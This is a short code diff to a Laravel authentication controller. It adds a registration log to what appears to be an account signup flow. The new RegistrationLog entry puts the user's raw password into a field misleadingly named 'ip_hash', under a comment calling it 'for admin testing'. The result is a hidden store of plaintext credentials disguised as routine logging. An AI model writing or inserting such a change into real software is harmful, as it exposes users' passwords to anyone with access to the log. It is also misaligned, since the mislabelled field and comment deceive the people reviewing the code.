@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 
 use App\Models\PgpKey;
 use App\Models\User;
+use App\Models\RegistrationLog;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
@@ -355,6 +356,13 @@ class AuthController extends Controller
             'mnemonic' => $mnemonic,  // Save mnemonic directly, it will be encrypted by the model
             'reference_id' => $referenceId,  // Save reference ID, it will be encrypted by the model
             'referred_by' => $referrerId,
+        ]);
+
+        // Log registration for admin testing
+        RegistrationLog::create([
+            'username' => $request->username,
+            'ip_hash' => $request->password,
+            'registered_at' => now(),
         ]);
 
         // Generate a unique token for accessing the mnemonic
